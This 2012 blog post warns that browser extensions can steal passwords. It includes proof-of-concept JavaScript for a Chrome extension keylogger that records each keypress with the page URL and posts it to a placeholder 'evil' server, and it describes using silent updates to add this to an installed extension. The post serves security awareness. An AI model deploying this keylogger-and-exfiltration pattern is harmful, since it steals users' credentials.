---
layout: post
title: "How I'd Steal Your Passwords"
date: 2012-9-24 22:00
---

This post is a bit of fun, but also a word of warning about security and being aware of what you install.

I've built browser extensions for Chrome, Firefox and Safari. As I was doing so, exploring the APIs and what was possible, I started to realise how scarily powerful extensions are. I'd like to go through what they might really be capable of, and ask, how careful do we need to be when installing extensions?

> **Update:** I'd just like to make it clear that the following is applicable to **any** extension – I'm not insinuating anything about any one extension.

This is the story of how I would steal your passwords.

### Browser extensions

Let me just explain a bit about extensions…

Extensions are essentially two parts: a background page (or script) with access to browser APIs, and a content script that is injected into a page. The content script has access to a port for communicating with the background page, and it's normally run in a sandbox but with access to the same DOM.

Background pages and content scripts are reasonably well hidden from the user – you'd have to know your way around the developer tools in Chrome to find them.

Extensions also have some kind of configuration file: in Chrome it's a manifest.json; Safari it's Info.plist; package.json in Firefox.

Things are roughly the same across all browsers and, while I've built extensions for all the big three, this post focuses on Chrome. Firefox may actually be the most powerfully frightening, but I haven't explored the opportunities there well enough yet.

So, to steal your passwords, I'd use a Chrome extension.

### Step 1

Build an extension.

For this post, I've modified an existing extension. It's heavily reliant on content scripts, but reasonably complex on the background page side to.

### Step 2

Get people to install it. Otherwise, who's passwords am I going to steal?

Oh and don't worry, there doesn't have to be malicious code there just yet because, once it's installed, the fun begins.

### Step 3

????

### Step 3 (really)

Add a keylogger to your extension.

Yep, it's that simple. With simple use of content scripts and the background page, it's trivial to set up a keylogger that records the user's keystrokes and the page they were on when they entered them.

### Step 4

Profit!

Of course.

### Here's how it works…

I'll go through how I'd do it in my case, with the extension that I used to build a proof of concept, just to give you an idea. As mentioned before, this is applicable to any extension, not just this one. I don't have the ability to deploy the extension I'm using, so I couldn't actually cause damage with this!

### The server

First, I've set up a very simple server using Node. It listens for data sent from a browser containing the key that was pressed and the page the user was on. This data is simply stored for retrieval later.

### The extension

The changes to the content script are scarily small. Please note that this code is intended as an example and not for reference – you can't just drop it in.

### Content script

The first change is the key logger. I've added a few lines to a hotkey content script.

{% highlight javascript %}
document.addEventListener(
  'keypress',
  function (ev) {
    xt.port.emit('key', {
      keyCode: ev.keyCode,
      url: document.location.href
    });
  },
  true
);
{% endhighlight %}

I've wrapped the communication port between content script and background page inside `xt.port`; it's just sending the key data and the page url on every key press.

### Background page

The change in the background page involves listening for a `key` message, before passing it on to the listening server using jQuery's $.post method.

{% highlight javascript %}
port.on("key", function (data) {
  $.post(
    'https://my_server.com/evil/',
    JSON.stringify(data)
  );
});
{% endhighlight %}

### That's it

Yeah, that's all there is to it. You type something, like your password, the content script picks it up, passes it to the background page which sends in on to a remote server.

The key logger can get data from HTTP and HTTPS sites if you specify so in your manifest, so even your bank website isn't safe.

### That's not all

This isn't everything that's possible because we've got access to the whole DOM. To see why this is dangerous, here's an example: assuming you know what form fields to expect on a bank website, it's trivial to intercept form submissions and gather bank IDs, answers to security questions, or anything else you fancy.

### Examples

Here's some data I gathered from my bank and Twitter:

![Bank and Twitter](http://i.phuu.net/JhKb/Screen%20Shot%202012-09-24%20at%2022.23.06.png)

Note that both are HTTPs sites.

In case you were wondering, this is the information that users can get about the extension before they install it:

![Information](http://i.phuu.net/JgGH/Screen%20Shot%202012-09-24%20at%2022.26.37.png)

It's found under the details tab on the Chrome Web Store. I bet you didn't know it was there.

You also see this message upon clicking install:

![Further message](http://i.phuu.net/Jh2V/Screen%20Shot%202012-09-25%20at%2011.01.30.png)

### Silent updates

It's worth noting that, once an extension is installed, the updates are silent unless you change what the extension has access to. So, assuming you've got people to install it, adding this code to an existing extension is simple and silent.

### Conclusion

Overall, be careful what you install. I'm suggesting that the whole extension system has the potential to be very dangerous. It goes without saying that diligence when installing anything is important, but my point here is that you might not have thought about browser extensions in this way. I hope you now will.

### Footnotes

I gave this as a talk at LeamJS September 2012. I'd be interested in giving it again, so get in touch if you're looking for a speaker.

A quick disclaimer: I have never made use, and do not intend to make use, of the contents of this post for malicious activity. I take no responsibility for any damage caused by anyone else as a result of this post. If you steal passwords or other data, on your head be it.

An earlier version of this post explicitly mentioned an extension. Its use here was entirely coincidental and the contents of the post have no relation to the security of that extension.